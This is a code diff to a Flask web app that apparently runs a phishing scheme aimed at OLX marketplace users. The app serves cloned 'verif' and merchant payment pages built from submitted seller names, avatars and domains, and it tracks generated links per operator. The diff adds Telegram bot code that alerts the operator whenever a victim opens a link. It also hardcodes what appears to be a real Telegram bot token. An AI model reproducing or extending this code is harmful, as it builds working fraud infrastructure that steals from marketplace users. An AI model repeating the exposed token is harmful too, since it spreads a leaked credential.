@@ -1,13 +1,47 @@
-from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory
 import os
 import shutil
-from bs4 import BeautifulSoup
 import json
+import requests
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
+# Настройки Telegram
+API_TOKEN = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
+
+# Путь к файлу со ссылками
+LINKS_FILE = '/home/user/app/data/links.json'
+
+def send_telegram_message(chat_id, text):
+    data = {
+        'chat_id': chat_id,
+        'text': text
+    }
+    response = requests.post(TELEGRAM_API_URL, data=data)
+    return response.json()
+
+def load_links():
+    if os.path.exists(LINKS_FILE):
+        with open(LINKS_FILE, 'r', encoding='utf-8') as file:
+            return json.load(file)
+    return []
+
+def get_user_id_by_random_id(random_id):
+    links = load_links()
+    for link in links:
+        if link['link_id'] == random_id:
+            return link['user_id']
+    return None
+
 @app.route('/verif/<random_id>', methods=['POST'])
-def save_page(random_id):
+def handle_verif_link(random_id):
+    user_id = get_user_id_by_random_id(random_id)
+    if user_id:
+        send_telegram_message(user_id, f"Переход по ссылке! link_id: {random_id}")
+
+    # Логика для сохранения страницы или другой обработки
     seller_name_tag = request.form.get('seller_name_tag')
     avatar_url = request.form.get('avatar_url')
     current_domain = request.form.get('current_domain')
@@ -70,11 +104,9 @@ def serve_merchant_page(random_id):
     return send_from_directory(merchant_path, 'index.html')
 
 @app.route('/load_links', methods=['GET'])
-def load_links():
-    links_file = '/home/user/app/data/links.json'
-
-    if os.path.exists(links_file):
-        with open(links_file, 'r', encoding='utf-8') as file:
+def load_links_route():
+    if os.path.exists(LINKS_FILE):
+        with open(LINKS_FILE, 'r', encoding='utf-8') as file:
             links = json.load(file)
     else:
         links = []
@@ -87,7 +119,7 @@ def save_link():
     if not link_data:
         return jsonify({'error': 'No data provided'}), 400
 
-    links_file = '/home/user/app/data/links.json'
+    links_file = LINKS_FILE
     links_dir = os.path.dirname(links_file)
 
     # Создаем директорию, если она не существует
@@ -121,7 +153,7 @@ def delete_ad():
     if not ad_id:
         return jsonify({'error': 'No ad_id provided'}), 400
 
-    links_file = '/home/user/app/data/links.json'
+    links_file = LINKS_FILE
     verif_path = f'/var/www/olx-verif/verif/{ad_id}'
     merchant_path = f'/var/www/olx-verif/merchant/{ad_id}'
 
@@ -155,7 +187,7 @@ def delete_all_ads():
     if not user_id:
         return jsonify({'error': 'No user_id provided'}), 400
 
-    links_file = '/home/user/app/data/links.json'
+    links_file = LINKS_FILE
 
     # Загружаем существующие данные
     if os.path.exists(links_file):
